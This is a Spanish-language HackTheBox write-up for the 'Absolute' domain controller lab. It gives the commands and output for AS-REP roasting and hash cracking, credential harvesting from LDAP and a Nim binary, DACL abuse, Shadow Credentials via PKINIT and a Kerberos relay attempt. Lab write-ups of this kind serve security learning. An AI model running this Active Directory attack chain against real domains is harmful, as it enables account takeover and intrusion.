@@ -1,0 +1,805 @@
+---
+category: writeup
+machine_name: Absolute
+platform: HackTheBox
+difficulty: Insana
+title: "Máquina Absolute"
+description: "Resolución de la máquina Absolute de HackTheBox"
+tags: ["OSINT","Kerberoast","Info exfiltration","Binary analysis", "DACL Abuse", "msDS-KeyCredentialLink", "PKINIT", "Kerberos Relaying", "Shadow Credentials"]
+---
+
+En esta máquina Windows encontraremos un controlador de dominio con un sitio web al cual efectuándole OSINT encontraremos 6 nombres de usuarios y uno de ellos tendrá la pre-autenticación de Kerberos deshabilitada; podremos obtener un TGT con su hash que vamos a crackear. La máquina tiene a todos sus usuarios en el grupo "Protected Users" por lo cual vamos a estar interactuando con la máquina mediante Kerberos.
+
+Con la credencial que obtuvimos, encontraremos la contraseña del usuario de un servicio SMB que tiene acceso a un Share con un binario PE32 escrito en el lenguaje de programación [Nim](https://nim-lang.org/), analizando su comportamiento vemos que intenta hacer una autenticación LDAP hacía el controlador con las credenciales de otro usuario; ese usuario será propietario de un grupo al que no está agregado, pero dicho grupo tiene permisos de escritura en las propiedades no-protegidas del usuario que maneja el servicio de WinRM. Luego de efectuar el abuso de las DACL escalaremos privilegios aprovechándonos del servicio LDAP para llevar a cabo un ataque de Shadow Credentials contra la cuenta de computador principal del controlador de dominio.
+
+<h2>RECONOCIMIENTO</h2>
+
+La máquina tiene los puertos comunes de un controlador de dominio de Active Directory.
+
+{% highlight bash %}
+# Nmap 7.92 scan initiated Tue Nov 29 13:03:00 2022 as: nmap -sS -Pn -n -vvv --min-rate 5000 -oN ports -p- --open 10.10.11.181
+Nmap scan report for 10.10.11.181
+Host is up, received user-set (0.48s latency).
+Scanned at 2022-11-29 13:03:00 -04 for 46s
+Not shown: 40007 filtered tcp ports (no-response), 25514 closed tcp ports (reset)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE       REASON
+53/tcp    open  domain        syn-ack ttl 127
+80/tcp    open  http          syn-ack ttl 127
+88/tcp    open  kerberos-sec  syn-ack ttl 127
+135/tcp   open  msrpc         syn-ack ttl 127
+139/tcp   open  netbios-ssn   syn-ack ttl 127
+389/tcp   open  ldap          syn-ack ttl 127
+464/tcp   open  kpasswd5      syn-ack ttl 127
+445/tcp   open  microsoft-ds  syn-ack ttl 127
+636/tcp   open  ldapssl       syn-ack ttl 127
+3268/tcp  open  globalcatLDAP syn-ack ttl 127
+5985/tcp  open  wsman         syn-ack ttl 127
+47001/tcp open  winrm         syn-ack ttl 127
+49665/tcp open  unknown       syn-ack ttl 127
+49666/tcp open  unknown       syn-ack ttl 127
+49667/tcp open  unknown       syn-ack ttl 127
+49694/tcp open  unknown       syn-ack ttl 127
+49702/tcp open  unknown       syn-ack ttl 127
+52886/tcp open  unknown       syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Tue Nov 29 13:03:46 2022 -- 1 IP address (1 host up) scanned in 45.78 seconds
+{% endhighlight %}
+
+El sitio web que tiene parece que es de ventas de libros, por DNS no hay nada interesante y no podemos acceder por SMB, RPC ni LDAP como invitado o anónimo.
+
+![Absolutely gorgeous](/assets/writeups/absolute/1.png)
+
+A pesar de que no podamos acceder por ninguno de los servicios mencionados anteriormente, usando CrackMapExec en el puerto SMB nos dice que el dominio de la máquina es "absolute.htb" y su nombre es "DC"; lo que quiere decir que esto es totalmente un controlador de dominio
+
+{% highlight bash %}
+❯ cme smb 10.10.11.181
+SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+{% endhighlight %}
+
+Agregaremos el dominio absolute.htb y dc.absolute.htb a nuestro archivo de hosts para identificar correctamente a la máquina. Al ser un servidor de directorio activo es recomendable también vincular nuestro reloj con el objetivo.
+
+{% highlight bash %}
+❯ sudo ntpdate 10.10.11.181
+[sudo] contraseña para vzon: 
+25 May 21:58:36 ntpdate[8784]: step time server 10.10.11.181 offset +25195.367754 sec
+{% endhighlight%}
+
+Ya estando todo listo, podemos comenzar.
+
+<h2>INTRUSIÓN</h2>
+
+Haciendo un poco de OSINT al sitio podemos buscar entre sus archivos multimedia para ver si tienen algún mensaje oculto o metadatos interesantes... las imágenes del sitio mostradas en el portal son las que llaman la atención.
+
+{% highlight bash %}
+❯ exiftool hero_4.jpg
+ExifTool Version Number         : 12.60
+File Name                       : hero_4.jpg
+Directory                       : .
+File Size                       : 2.1 MB
+File Modification Date/Time     : 2023:05:25 14:19:40-04:00
+File Access Date/Time           : 2023:05:25 14:19:40-04:00
+File Inode Change Date/Time     : 2023:05:25 14:19:49-04:00
+File Permissions                : -rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : inches
+X Resolution                    : 72
+Y Resolution                    : 72
+XMP Toolkit                     : Image::ExifTool 11.88
+Author                          : Sarah Osvald
+Profile CMM Type                : Linotronic
+Profile Version                 : 2.1.0
+Profile Class                   : Display Device Profile
+Color Space Data                : RGB
+Profile Connection Space        : XYZ
+Profile Date Time               : 1998:02:09 06:49:00
+Profile File Signature          : acsp
+Primary Platform                : Microsoft Corporation
+CMM Flags                       : Not Embedded, Independent
+Device Manufacturer             : Hewlett-Packard
+...
+{% endhighlight %}
+
+Tienen autores... tenemos un potencial nombre de usuario que puede existir en el servidor, pero antes de probarlo debemos pensar como puede ser el nombre de usuario o nickname de esta persona en el sistema; normalmente en servidores Windows se les suele colocar como nombre del sistema a usuarios de la empresa sus nombres y apellidos separados por un punto, o la inicial de sus nombres y su apellido separados con un punto también...
+
+```
+sarah.osvald
+s.osvald
+```
+
+Por Kerberos podemos verificar de forma sencilla si alguno de estos usuarios existe, al probar con ambos nicknames, el segundo parece ser el único que existe.
+
+{% highlight bash %}
+❯ kerbrute userenum --dc 10.10.11.181 -d absolute.htb users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 05/25/23 - Ronnie Flathers @ropnop
+
+2023/05/25 14:26:41 >  Using KDC(s):
+2023/05/25 14:26:41 >  	10.10.11.181:88
+
+2023/05/25 14:26:41 >  [+] VALID USERNAME:	s.osvald@absolute.htb
+2023/05/25 14:26:41 >  Done! Tested 2 usernames (1 valid) in 0.141 seconds
+{% endhighlight %}
+
+Buscando entre las otras imagenes encontramos más nombres de usuarios, vamos a armarnos una lista con ellos:
+
+{% highlight bash %}
+s.osvald (Sarah Osvald)
+j.roberts (James Roberts)
+m.chaffrey (Michael Chaffrey)
+d.klay (Donald Klay)
+j.robinson (Jeffer Robinson)
+n.smith (Nicole Smith)
+{% endhighlight %}
+
+Al probar esta lista con Kerbrute, nos dice que todos son válidos y Donald Klay parece tener el requisito de pre autenticación deshabilitado.
+
+{% highlight bash %}
+❯ kerbrute userenum --dc 10.10.11.181 -d absolute.htb users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: dev (n/a) - 05/25/23 - Ronnie Flathers @ropnop
+
+2023/05/25 14:30:52 >  Using KDC(s):
+2023/05/25 14:30:52 >  	10.10.11.181:88
+
+2023/05/25 14:30:52 >  [+] VALID USERNAME:	s.osvald@absolute.htb
+2023/05/25 14:30:53 >  [+] VALID USERNAME:	j.robinson@absolute.htb
+2023/05/25 14:30:53 >  [+] VALID USERNAME:	n.smith@absolute.htb
+2023/05/25 14:30:53 >  [+] VALID USERNAME:	j.roberts@absolute.htb
+2023/05/25 14:30:53 >  [+] VALID USERNAME:	m.chaffrey@absolute.htb
+2023/05/25 14:30:54 >  [+] d.klay has no pre auth required. Dumping hash to crack offline:
+$krb5asrep$18$d.klay@ABSOLUTE.HTB:1bda5a0fc1cd9cadceb182bdddcd34e1$a1127bc06ce3401a1fe54541256d28e13924281833a3c10405f19a5d3b08ee92a9ba3588977f954b8a7e58af4263942ad1953ede06cf03d4dfd4ea71912ecb4e4d1a2f080f6de22dca73304f4e0351c2ec87ceb5edd003d4e113a47692e4ac7ee3ce00473cc02767f888a8684b1dac0e6518015b7ae726631cab51a37fdcccadeb562ccc916ba2d1ed2859030127183e0cefd47813c23d9c09182b99ebea001c3d480367c0fa8e70365383dc61eb872c42dcd9684b33199575907fac65d5e06efce1611573ae29eeb12c7496b3c8302dae16112447afea11bb4054fb982eb5e9691672d4ca9ff88b2a17db299cfec388b95738421179e57155ec58951d62bf26
+2023/05/25 14:30:54 >  [+] VALID USERNAME:	d.klay@absolute.htb
+2023/05/25 14:30:54 >  Done! Tested 6 usernames (6 valid) in 1.433 seconds
+{% endhighlight %}
+
+Voy a usar el script GetNPUsers.py de impacket para obtener el hash, ya que el de Kerbrute me da un poco de problemas con el hashcat. Puedes usar el de kerbrute si a ti no te causa ningún incoveniente.
+
+{% highlight bash %}
+$krb5asrep$23$d.klay@ABSOLUTE.HTB:9c8ebdc617bd9a0853a157858c51f8b3$d4e31a11b78085b394474c89c9f025f81810914ae75df9f82ebe149a9f842179ca3c08b26abb7cb275951633341901fc5b14fb743fc98891f15d1573c127ab953f4839691a741eda3eeb00105d74cfb0e51340a6f1773e959ea76ae209481c9b4502032bd381dca228c35f5199b71daf963ebfd23ef45b7a1d7a093c2ef000b59dd9fa63ba0c60e6c947fc68539124d945bec429aee3ff8dcca6c11dea06ee63d1e88281aa0f07a0927c095d277c3fdd7ec482a7fb3420f6b075855e7d0403dfd2554229095a762e1d3b9ddec83d9e803d691c4e81a0218ed7a524e075d018b1dc589dd0d38186d915fc6b54:Darkmoonsky248girl
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
+Hash.Target......: $krb5asrep$23$d.klay@ABSOLUTE.HTB:9c8ebdc617bd9a085...fc6b54
+Time.Started.....: Thu May 25 14:35:43 2023 (15 secs)
+Time.Estimated...: Thu May 25 14:35:58 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:   760.0 kH/s (1.32ms) @ Accel:512 Loops:1 Thr:1 Vec:8
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 11239424/14344384 (78.35%)
+Rejected.........: 0/11239424 (0.00%)
+Restore.Point....: 11237376/14344384 (78.34%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: Darrylhi -> Daniel23paula11
+Hardware.Mon.#1..: Temp: 77c Util: 84%
+
+Started: Thu May 25 14:35:18 2023
+Stopped: Thu May 25 14:36:00 2023
+{% endhighlight %}
+
+Pero ocurre que si nos intentamos autenticar como este usuario...
+
+{% highlight bash %}
+❯ cme smb 10.10.11.181 -u d.klay -p "Darkmoonsky248girl"
+SMB         10.10.11.181    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+SMB         10.10.11.181    445    DC               [-] absolute.htb\d.klay:Darkmoonsky248girl STATUS_ACCOUNT_RESTRICTION 
+{% endhighlight %}
+
+No nos deja; puede que este usuario esté dentro del grupo de [Usuarios protegidos](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group) o tenga alguna restricción ya que por RPC o LDAP tampoco nos deja, para probar a intentar acceder a un servicio mediante Kerberos.
+
+El TGT lo sacamos con éxito con la herramienta de impacket `getTGT.py`
+
+{% highlight bash %}
+❯ getTGT.py absolute.htb/d.klay:Darkmoonsky248girl
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Saving ticket in d.klay.ccache
+❯ export KRB5CCNAME=d.klay.ccache
+❯ klist
+Ticket cache: FILE:d.klay.ccache
+Default principal: d.klay@ABSOLUTE.HTB
+
+Valid starting     Expires            Service principal
+25/05/23 22:43:54  26/05/23 02:43:54  krbtgt/ABSOLUTE.HTB@ABSOLUTE.HTB
+	renew until 26/05/23 02:43:54
+{% endhighlight %}
+
+Ahora necesitamos un servicio para comunicarse, existen SPNs predefinidos para los servicios de LDAP, WinRM y SMB; en este caso voy a usar el de LDAP que tomando en cuenta el dominio seria `ldap/dc.absolute.htb`
+
+{% highlight bash %}
+❯ getST.py -spn ldap/dc.absolute.htb -k -no-pass absolute.htb/d.klay
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Using TGT from cache
+[*] Getting ST for user
+[*] Saving ticket in d.klay.ccache
+{% endhighlight %}
+
+Ahora... ¿cómo podemos hacer que la herramienta ldapsearch utilize Kerberos?, en Arch Linux debes instalar la librería "cyrus-sasl-gssapi" e indicarle el tipo de autenticación a la herramienta con el parametro `-Y`. En sistemas basados en Debian usa "libsasl2-modules-gssapi-mit"
+
+{% highlight bash %}
+❯ ldapsearch -Y GSSAPI -H "ldap://dc.absolute.htb" -b "CN=Users,DC=absolute,DC=htb"
+SASL/GSSAPI authentication started
+SASL username: d.klay@ABSOLUTE.HTB
+SASL SSF: 256
+SASL data security layer installed.
+# extended LDIF
+#
+# LDAPv3
+# base <CN=Users,DC=absolute,DC=htb> with scope subtree
+# filter: (objectclass=*)
+# requesting: ALL
+#
+
+# Users, absolute.htb
+dn: CN=Users,DC=absolute,DC=htb
+objectClass: top
+objectClass: container
+cn: Users
+description: Default container for upgraded user accounts
+distinguishedName: CN=Users,DC=absolute,DC=htb
+instanceType: 4
+whenCreated: 20220609081618.0Z
+whenChanged: 20220609081618.0Z
+uSNCreated: 5660
+uSNChanged: 5660
+showInAdvancedViewOnly: FALSE
+name: Users
+objectGUID:: XIb3hs1S0E2S0rHpvybEXA==
+systemFlags: -1946157056
+objectCategory: CN=Container,CN=Schema,CN=Configuration,DC=absolute,DC=htb
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20220609081639.0Z
+dSCorePropagationData: 16010101000001.0Z
+
+# krbtgt, Users, absolute.htb
+dn: CN=krbtgt,CN=Users,DC=absolute,DC=htb
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+...
+{% endhighlight %}
+
+Mirando por todo lo que nos devolvió LDAP vemos que nuestra teoría era cierta
+
+{% highlight bash %}
+# Protected Users, Users, absolute.htb
+dn: CN=Protected Users,CN=Users,DC=absolute,DC=htb
+objectClass: top
+objectClass: group
+cn: Protected Users
+description: Members of this group are afforded additional protections against
+  authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=
+ 298939 for more information.
+member: CN=winrm_user,CN=Users,DC=absolute,DC=htb
+member: CN=svc_audit,CN=Users,DC=absolute,DC=htb
+member: CN=svc_smb,CN=Users,DC=absolute,DC=htb
+member: CN=d.lemm,CN=Users,DC=absolute,DC=htb
+member: CN=s.johnson,CN=Users,DC=absolute,DC=htb
+member: CN=c.colt,CN=Users,DC=absolute,DC=htb
+member: CN=l.moore,CN=Users,DC=absolute,DC=htb
+member: CN=m.lovegod,CN=Users,DC=absolute,DC=htb
+member: CN=n.smith,CN=Users,DC=absolute,DC=htb
+member: CN=j.robinson,CN=Users,DC=absolute,DC=htb
+member: CN=s.osvald,CN=Users,DC=absolute,DC=htb
+member: CN=D.Klay,CN=Users,DC=absolute,DC=htb
+member: CN=M.Chaffrey,CN=Users,DC=absolute,DC=htb
+member: CN=J.Roberts,CN=Users,DC=absolute,DC=htb
+distinguishedName: CN=Protected Users,CN=Users,DC=absolute,DC=htb
+instanceType: 4
+whenCreated: 20220609081638.0Z
+whenChanged: 20220906170716.0Z
+uSNCreated: 12448
+uSNChanged: 135233
+name: Protected Users
+objectGUID:: jyyry93toUWcYSpS5PUWiw==
+objectSid:: AQUAAAAAAAUVAAAAnSwX8yHn8FjpghKZDQIAAA==
+sAMAccountName: Protected Users
+sAMAccountType: 268435456
+groupType: -2147483646
+objectCategory: CN=Group,CN=Schema,CN=Configuration,DC=absolute,DC=htb
+isCriticalSystemObject: TRUE
+dSCorePropagationData: 20220609081639.0Z
+dSCorePropagationData: 16010101000001.0Z
+{% endhighlight %}
+
+Vamos a editar nuestra configuración de Kerberos para poder utilizar herramientas como evil-winrm, smbclient y rpcclient ya que dependen de ello; normalmente el archivo se deja como `/etc/krb5.conf`, al menos en Arch Linux.
+
+{% highlight bash %}
+[libdefaults]
+    default_realm = ATHENA.MIT.EDU
+
+[realms]
+# Primero se indica un realm, y luego su respectivo KDC (Key Distribution Center)
+    ABSOLUTE.HTB = {
+        kdc = dc.absolute.htb
+    }
+    ANDREW.CMU.EDU = {
+        admin_server = kdc-01.andrew.cmu.edu
+    }
+
+[domain_realm]
+    csail.mit.edu = CSAIL.MIT.EDU
+    .ucsc.edu = CATS.UCSC.EDU
+
+[logging]
+#   kdc = CONSOLE
+{% endhighlight %}
+
+Continuando con la máquina, también hay más usuarios, interesante... si buscamos por la descripción de cada uno encontraremos a uno que resalta sobre los otros
+
+{% highlight bash %}
+# J.Roberts, Users, absolute.htb
+dn: CN=J.Roberts,CN=Users,DC=absolute,DC=htb
+
+# M.Chaffrey, Users, absolute.htb
+dn: CN=M.Chaffrey,CN=Users,DC=absolute,DC=htb
+
+# D.Klay, Users, absolute.htb
+dn: CN=D.Klay,CN=Users,DC=absolute,DC=htb
+
+# s.osvald, Users, absolute.htb
+dn: CN=s.osvald,CN=Users,DC=absolute,DC=htb
+
+# j.robinson, Users, absolute.htb
+dn: CN=j.robinson,CN=Users,DC=absolute,DC=htb
+
+# n.smith, Users, absolute.htb
+dn: CN=n.smith,CN=Users,DC=absolute,DC=htb
+
+# m.lovegod, Users, absolute.htb
+dn: CN=m.lovegod,CN=Users,DC=absolute,DC=htb
+
+# l.moore, Users, absolute.htb
+dn: CN=l.moore,CN=Users,DC=absolute,DC=htb
+
+# c.colt, Users, absolute.htb
+dn: CN=c.colt,CN=Users,DC=absolute,DC=htb
+
+# s.johnson, Users, absolute.htb
+dn: CN=s.johnson,CN=Users,DC=absolute,DC=htb
+
+# d.lemm, Users, absolute.htb
+dn: CN=d.lemm,CN=Users,DC=absolute,DC=htb
+
+# svc_smb, Users, absolute.htb
+dn: CN=svc_smb,CN=Users,DC=absolute,DC=htb
+description: AbsoluteSMBService123!
+
+# svc_audit, Users, absolute.htb
+dn: CN=svc_audit,CN=Users,DC=absolute,DC=htb
+
+# winrm_user, Users, absolute.htb
+dn: CN=winrm_user,CN=Users,DC=absolute,DC=htb
+description: Used to perform simple network tasks
+
+# Photographers, Users, absolute.htb
+dn: CN=Photographers,CN=Users,DC=absolute,DC=htb
+description: Say cheeeeese!
+
+# Networkers, Users, absolute.htb
+dn: CN=Networkers,CN=Users,DC=absolute,DC=htb
+description: We do network things often times very bad
+
+# Network Audit, Users, absolute.htb
+dn: CN=Network Audit,CN=Users,DC=absolute,DC=htb
+description: Branch to do some auditing
+
+# search result
+search: 4
+result: 0 Success
+
+# numResponses: 42
+# numEntries: 41
+{% endhighlight %}
+
+svc_smb, o la cuenta de lo que parece ser el servicio SMB tiene algo parecido a una contraseña en la descripción; es la misma de la cuenta
+
+{% highlight bash %}
+❯ getTGT.py absolute.htb/svc_smb:AbsoluteSMBService123!
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Saving ticket in svc_smb.ccache
+{% endhighlight %}
+
+Esta cuenta al tener el nombre que tiene, debe tener algo por el servicio SMB, por lo que vamos a pedir un TGS para el SPN `cifs/dc.absolute.htb`; por defecto cifs es el identificador spn del servicio SMB por Kerberos.
+
+{% highlight bash %}
+❯ getST.py -k -no-pass -spn cifs/dc.absolute.htb absolute.htb/svc_smb
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Using TGT from cache
+[*] Getting ST for user
+[*] Saving ticket in svc_smb.ccache
+{% endhighlight %}
+
+Usando el `smbclient.py` de impacket vemos un recurso llamado "Shared" que no suele venir por defecto.
+
+{% highlight bash %}
+❯ smbclient.py -no-pass -k absolute.htb/svc_smb@dc.absolute.htb
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+Type help for list of commands
+# ls
+[-] No share selected
+# shares
+ADMIN$
+C$
+IPC$
+NETLOGON
+Shared
+SYSVOL
+{% endhighlight %}
+
+Solamente tiene dos archivos, un shell script y un ejecutable de Windows
+
+{% highlight bash %}
+# use Shared
+# ls
+drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 .
+drw-rw-rw-          0  Thu Sep  1 13:02:23 2022 ..
+-rw-rw-rw-         72  Thu Sep  1 13:02:23 2022 compiler.sh
+-rw-rw-rw-      67584  Thu Sep  1 13:02:23 2022 test.exe
+{% endhighlight %}
+
+El shell script tiene un comando para compilar un fichero del lenguaje de programación [Nim](https://nim-lang.org/),
+podemos pensar que el exe se compiló de este mismo lenguaje por lo cual analizar símbolos y funciones con Ghidra puede que sea inútil.
+
+{% highlight bash %}
+#!/bin/bash
+
+nim c -d:mingw --app:gui --cc:gcc -d:danger -d:strip $1
+{% endhighlight %}
+
+Para analizar correctamente este extraño programa vamos a tener que irnos a Windows para ejecutarlo en un debugger, yo utilizaré [x64dbg](https://x64dbg.com/) para ver el comportamiento del programa.
+
+Al ejecutarlo, viendo el trace de memoria del programa parece que en cierto instante intentó una autenticación LDAP con el usuario m.lovegod y terminó de forma errónea con una excepción de tipo "RPC_S_SERVER_UNAVAILABLE" al no poder comunicarse con el servidor de Absolute
+
+![Absolute LDAP!](/assets/writeups/absolute/2.png)
+
+También hay lo que parece ser una contraseña, la cual si probamos es correcta.
+
+{% highlight bash %}
+❯ getTGT.py absolute.htb/m.lovegod:AbsoluteLDAP2022!
+Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
+
+[*] Saving ticket in m.lovegod.ccache
+{% endhighlight %}
+
+El usuario no parece tener otra cosa interesante, por lo que procederemos a usar BloodHound, pero el único problema es que el ingestor oficial de Python de BloodHound no funciona con Kerberos... afortunadamente existe una [versión alterada](https://github.com/jazzpizazz/BloodHound.py-Kerberos) que si soporta Kerberos
+
+{% highlight bash %}
+❯ kbloodhound-python -c all -k -u "m.lovegod@absolute.htb" -d absolute.htb -dc dc.absolute.htb -no-pass --zip -ns 10.10.11.181 --dns-tcp
+INFO: Found AD domain: absolute.htb
+INFO: Using TGT from cache
+INFO: Found TGT with correct principal in ccache file.
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.absolute.htb
+INFO: Found 18 users
+INFO: Found 55 groups
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: dc.absolute.htb
+INFO: Ignoring host dc.absolute.htb since its reported name  does not match
+INFO: Done in 00M 28S
+INFO: Compressing output into 20230526012954_bloodhound.zip
+{% endhighlight %}
+
+Buscando por permisos que tenga el usuario m.lovegod sobre otros objetos encontramos esto
+
+![when Owns Network Audit](/assets/writeups/absolute/3.png)
+
+Somos propietarios del grupo "Network Audit" aunque no estemos en él, pero no tenemos ninguna ACE en la DACL de este objeto que nos permita modificarlo por lo que vamos a tener que agregar una manualmente. Si seguimos buscando por este grupo también encontramos esto
+
+![When GenericWrite](/assets/writeups/absolute/4.png)
+
+Los miembros de este grupo pueden alterar propiedades del usuario `winrm_user`, y al ser GenericWrite entre estas propiedades está la del SPN y msDS-KeyCredentialLink. Vamos a irnos por la segunda.
+
+Primero necesitaremos un programa que nos permita editar la DACL del grupo mencionado anteriormente, existen programas como [pywerview](https://github.com/the-useless-one/pywerview) o [dacledit.py](https://github.com/ShutdownRepo/impacket/tree/dacledit) que nos pueden ayudar con esto, yo iré con la herramienta de dacledit.
+
+Al agregar una ACE para permitir todo tipo de edición por parte de nuestro usuario, el sistema nos dejará
+
+{% highlight bash %}
+❯ dacledit.py -target "Network Audit" -action write -ace-type allowed -rights FullControl -principal m.lovegod -k -no-pass -dc-ip dc.absolute.htb absolute.htb/m.lovegod
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] DACL backed up to dacledit-20230527-000057.bak
+[*] DACL modified successfully!
+{% endhighlight %}
+
+Con el comando `net` de las utilidades de Samba podemos agregarnos al grupo ahora
+
+{% highlight bash %}
+❯ net -U absolute.htb/m.lovegod%AbsoluteLDAP2022! --use-kerberos=required -S dc.absolute.htb rpc group addmem "Network Audit" m.lovegod
+{% endhighlight %}
+
+Ahora, debemos obtener un nuevo TGT de Kerberos para que nuestros permisos se actualizen, después de hacerlo usando la herramienta [pywhisker](https://github.com/ShutdownRepo/pywhisker) obtendremos un certificado con el cuál podremos obtener un TGT para el usuario `winrm_user` mediante el protocolo PKINIT
+
+{% highlight bash %}
+❯ pywhisker.py -d absolute.htb --dc-ip dc.absolute.htb -t winrm_user -u m.lovegod -k -f cert.pfx -a add
+[*] Searching for the target account
+[*] Target user found: CN=winrm_user,CN=Users,DC=absolute,DC=htb
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating KeyCredential
+[*] KeyCredential generated with DeviceID: 9c10fbb3-7980-ef5a-b9d4-1e024b4e9589
+[*] Updating the msDS-KeyCredentialLink attribute of winrm_user
+[+] Updated the msDS-KeyCredentialLink attribute of the target object
+[+] Saved PFX (#PKCS12) certificate & key at path: cert.pfx.pfx
+[*] Must be used with password: Yyv108JNyM8FhDcTMWEU
+[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
+{% endhighlight %}
+
+Usando el certificado que obtuvimos para generar un Ticket mediante el protocolo mencionado anteriormente funciona sin problemas, y podemos usarlo para autenticarnos por WinRM. El SPN de este servicio es `http/dc.absolute.htb` por si quieres hacerlo con otra herramienta que no sea evil-winrm.
+
+*La herramienta que utilizo para generar tickets por PKINIT está por GitHub, búscala :)*
+{% highlight bash %}
+❯ getTGTPKINIT.py -pfx-pass Yyv108JNyM8FhDcTMWEU -cert-pfx cert.pfx.pfx -dc-ip dc.absolute.htb absolute.htb/winrm_user winrm.ccache
+2023-05-27 00:05:07,667 minikerberos INFO     Loading certificate and key from file
+INFO:minikerberos:Loading certificate and key from file
+2023-05-27 00:05:07,693 minikerberos INFO     Requesting TGT
+INFO:minikerberos:Requesting TGT
+2023-05-27 00:05:32,413 minikerberos INFO     AS-REP encryption key (you might need this later):
+INFO:minikerberos:AS-REP encryption key (you might need this later):
+2023-05-27 00:05:32,413 minikerberos INFO     198847f4c90ec97a2f335679a67c510853f3d66c53c206539e6d679fb968009a
+INFO:minikerberos:198847f4c90ec97a2f335679a67c510853f3d66c53c206539e6d679fb968009a
+2023-05-27 00:05:32,417 minikerberos INFO     Saved TGT to file
+INFO:minikerberos:Saved TGT to file
+❯ export KRB5CCNAME=winrm.ccache
+❯ evil-winrm -i dc.absolute.htb -r absolute.htb
+
+Evil-WinRM shell v3.4
+
+Info: Establishing connection to remote endpoint
+
+*Evil-WinRM* PS C:\Users\winrm_user\Documents>
+{% endhighlight %}
+
+Podemos tomar ya la user flag sin problemas
+
+{% highlight powershell %}
+*Evil-WinRM* PS C:\Users\winrm_user> cd Desktop
+*Evil-WinRM* PS C:\Users\winrm_user\Desktop> type user.txt
+9ee873bd3fe9e285f7580bf8c6******
+{% endhighlight %}
+
+Ya es hora de convertirnos en administradores de absolute.htb.
+
+<h2>ESCALADA DE PRIVILEGIOS</h2>
+
+Este dominio tiene solo un usuario administrador (ya debes saber quién es), y no parece haber algo interesante con lo que podamos escalar privilegios ni por AD ni por el mismo Windows.
+
+Pero buscando por internet formas de escalar privilegios encontramos un programa llamado [KrbRelay](https://github.com/cube0x0/KrbRelay) que nos dice que podemos escalar privilegios retransmitiendo una autenticación Kerberos por COM hacía un servicio que no tenga el forzado de firma habilitado, desconocemos si los servicios de este controlador no tienen habilitado eso pero también se debe cumplir un prerequisito para el método que usa la herramienta: El servidor debe tener habilitado el soporte para la autenticación por PKINIT ya que por defecto intentará hacer un ataque de Shadow Credentials, y este servidor tiene soporte para ello como vimos anteriormente, por lo que simplemente habrá que intentar.
+
+Para abusar de esto vamos a necesitar la herramienta anteriormente mencionada u otra que contenga sus cosas como [KrbRelayUp](https://github.com/Dec0ne/KrbRelayUp) o [KrbRelayx](https://github.com/dirkjanm/krbrelayx) junto a otra que veremos a continuación.
+
+Intentando retransmitir la autenticación con el CLSID que la herramienta usa por defecto parece que no funciona, está desactivado o no existe...
+
+{% highlight powershell %}
+*Evil-WinRM* PS C:\Users\winrm_user\Documents> ./KrbRelayUp relay -d absolute.htb -m shadowcred -cn DC$ 
+KrbRelayUp - Relaying you to SYSTEM
+
+
+[+] Rewriting function table
+[+] Rewriting PEB
+[+] Init COM server
+[+] Register COM server
+[+] Forcing SYSTEM authentication
+System.Runtime.InteropServices.COMException (0x80070422): The service cannot be started, either because it is disabled or because it has no enabled devices associated with it. (Exception from HRESULT: 0x80070422)
+   at KrbRelayUp.Relay.Ole32.CoGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid& pclsid, Object pUnkOuter, CLSCTX dwClsCtx, IStorage pstg, UInt32 cmq, MULTI_QI[] rgmqResults)
+   at KrbRelayUp.Relay.Relay.Run()
+{% endhighlight %}
+
